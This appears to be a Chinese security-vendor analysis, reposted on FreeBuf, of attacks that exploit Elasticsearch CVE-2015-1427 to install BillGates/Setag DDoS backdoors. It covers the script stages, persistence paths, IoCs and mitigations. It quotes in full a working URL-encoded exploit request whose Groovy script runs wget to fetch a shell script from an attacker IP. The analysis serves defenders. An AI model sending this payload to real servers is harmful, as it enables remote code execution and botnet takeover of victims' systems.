**Elasticsearch对于网络犯罪集团而言并不陌生，它经常成为黑客们利用的工具。实际上，在今年的第一季度发生了大量针对Elasticsearch服务器的攻击。这些攻击主要还是以挖矿为目的，与去年的攻击目的相同。**

我们在最近的攻击行为中发现，攻击者并不是以挖矿这种经济利益为第一目的。这些攻击可以将受影响的目标将入到僵尸网络之中，并利用这些僵尸网络发起DDOS攻击。

攻击链包括搜索暴露在公开网络中可访问的Elasticsearch数据库或服务器，再通过恶意软件将编码后的java攻击命令带入目标查询搜索从而调用shell。一旦攻击行为成功，目标将从指定域中下载恶意脚本，在分析中发现指定域名是可变的。恶意脚本第一阶段会尝试关闭防火墙和已经在运行的挖矿进程，第二阶段会去尝试下载另一个恶意脚本以及payload，最后会在目标上执行payload。具体流程如下：

![1.jpg](https://image.3001.net/images/20190726/1564131304_5d3abfe854b21.jpg!small)

图1

攻击链  

在发现的攻击行为中发现，攻击中用得是CVE-2015-1427利用脚本，它是Elasticsearch的Groovy脚本引擎（版本1.3.0-1.3.7和1.4.0-1.4.2）中一个旧的且已经更新的漏洞，如下所示：

    
    
    request_url=”3[.]17[.]149[.]255[:]9200/_search?source=%7B%22query%22%3A+%7B%22filtered%22%3A+%7B%22query%22%3A+%7B%22match_all%22%3A+%7B%7D%7D%7D%7D%2C+%22script_fields%22%3A+%7B%22exp%22%3A+%7B%22script%22%3A+%22import+java.util.%2A%3Bimport+java.io.%2A%3BString+str+%3D+%5C%22%5C%22%3BBufferedReader+br+%3D+new+BufferedReader%28new+InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22wget+154.223.159.5%2Fs67.sh+-O+S67%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder+sb+%3D+new+StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3Bsb.append%28%5C%22%5Cr%5Cn%5C%22%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%2C+%22size%22%3A+1%7D

整个攻击分为两个部分，首先会运行s67.sh脚本（如图2所示），它会定义如何去寻找可用的shell并尝试去关闭防火墙，之后会通过curl指令或wget指令下载第二阶段脚本s66.sh。

![2.jpg](https://image.3001.net/images/20190726/1564131345_5d3ac0117460f.jpg!small)

图2  
第二阶段时脚本功能与第一阶段脚本相似，它会定义如何寻找shell并关闭防火墙，然后脚本会去删除某些特殊文件，特别是在/tmp目录下的挖矿配置文件，同时去关闭受感染系统上的其他挖矿进程，接着该脚本将删除初始感染的痕迹并终止在某些TCP端口上运行的进程，如图4所示。攻击的第二阶段还需要下载二进制文件（图5），这很可能是托管在受感染或灰色网站（gray
website)上。  

![3.jpg](https://image.3001.net/images/20190726/1564131387_5d3ac03b96bca.jpg!small)图3
第二阶段脚本代码片段与它杀死的进程

![4.png](https://image.3001.net/images/20190726/1564131446_5d3ac07611890.png!small)图4

![5.png](https://image.3001.net/images/20190726/1564131470_5d3ac08e572a5.png!small)图5

## BillGates/Setag Payloads

仔细研究该二进制文件发现它为一个后门的变种（Trend
Micro检测为ELF_SETAG.SM），它会窃取信通信息并发起DDOS攻击。同样的后门也被用于CVE-2017-5638，该漏洞是Apache
Struts 2中的一个远程代码执行漏洞。

这些样本具有BillGates恶意软件的标志，这些恶意软件首次在2014年，并以劫持系统和发起DDoS攻击而闻名。
最近，研究发现僵尸网络相关活动中涉及到BillGates恶意软件的变种。

图6显示了有效payload的代码片段。代码显示它可以阻止调试并检查它是否被篡改。
此恶意软件还会将受影响系统的systools（可以查看系统或设备信息）替换为自身副本，并将它们放置到/ usr / bin / dpkgd目录。
为了更持久的控制目标，该脚本将自己的副本创建到以下路径中：

    
    
    /etc/rc{1-5}.d/S97DbSecuritySpt
    
    /etc/rc{1-5}.d/S99selinux
    
    /etc/init.d/selinux
    
    /etc/init.d/DbSecuritySpt

![6.png](https://image.3001.net/images/20190726/1564131557_5d3ac0e58d12e.png!small)图6
反调试（左上角），多级执行（中上图），DDoS攻击类型（右上角）; systools列表（下）

## 分析结果

实际上，我们发现的针对Elasticsearch的许多恶意流量或攻击都是相对简单的，而且往往是利润驱动的。攻击者会查找不安全、配置错误的服务器或利用旧漏洞攻击Elasticsearch，然后植入由加密货币挖掘软件或是勒索软件组成的payload。

此次发现的攻击行为中采取预防措施来逃避检测并使用多阶段脚本执行技术，该攻击行为无疑是一个危险信号。这次攻击背后的网络犯罪分子使用了URL编码并在脚本存储路径等方面进行了细致分析，而受到攻击的网站可能只是攻击者在实际攻击之前用来测试工具或是用来当做日后攻击的备用资源。

此攻击体现了保护数字资产的重要性，因为不安全的Elasticsearch服务器的影响可能会对现实产生巨大影响。Elastic已针对此攻击利用的漏洞发布了修补程序和如何进行保护，正确配置和启用其安全功能的指南。其他安全手段（如数据分类，网络分段和入侵防御系统）也将有助于减少恶意软件和漏洞的进一步扩散。

## IoCs

### ELF_SETAG.SM (SHA-256):

    
    
    8ebd963f86ba62f45b936f6d6687ccb1e349a0f8a6cc19286457895c885695c8 (.pprt)
    
    cfe3dccf9ba5a17e410e8e7cf8d0ff5c1b8688f99881b53933006250b6421468 (.ppol)

### 相关domains/URLs:

    
    
    hxxps://crazydavesslots[.]com/[.]ppol
    
    hxxp://aduidc[.]xyz

 ***本文作者：Kriston，转载请注明来自FreeBuf.COM**

